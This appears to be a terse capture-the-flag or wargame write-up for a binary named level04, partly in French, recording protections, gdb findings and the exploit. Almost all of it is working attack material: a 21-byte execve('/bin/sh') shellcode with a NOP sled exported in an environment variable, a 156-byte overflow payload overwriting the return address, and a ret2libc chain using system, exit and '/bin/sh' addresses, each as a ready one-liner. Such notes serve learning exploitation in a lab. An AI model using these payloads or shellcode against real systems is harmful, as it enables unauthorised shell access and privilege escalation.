# 

## Protection

RELRO | STACK CANARY | NX | PIE
--- | --- | --- | --- 
**Partial RELRO** | No canary found | NX disabled | No PIE

## context

set follow-fork-mode child
stopped 0x6261616f in ??
Found at offset 156 (little-endian search) likely

payload= offset + buffer address(env)

- shell =```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)
- buffer env = 0xffff0101

export SHELLCODE=$(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 0xffff + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

cat <(python2.7 -c 'import sys; sys.stdout.write(b"a" * 156 + b"\x01\x01\xff\xff")') - | ./level04

Give me some shellcode, k

no exec() for you()

## Ret2Libc

cat /proc/sys/kernel/randomize_va_space
0

aslr not activated

[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]

info functions system
0xf7e6aed0  system

info functions exit
0xf7e5eb70  exit

info proc mapping
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.

cat <(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 156 + b"\xd0\xae\xe6\xf7" + b"\x70\xeb\xe5\xf7" + b"\xec\x97\xf8\xf7")') - | ./level04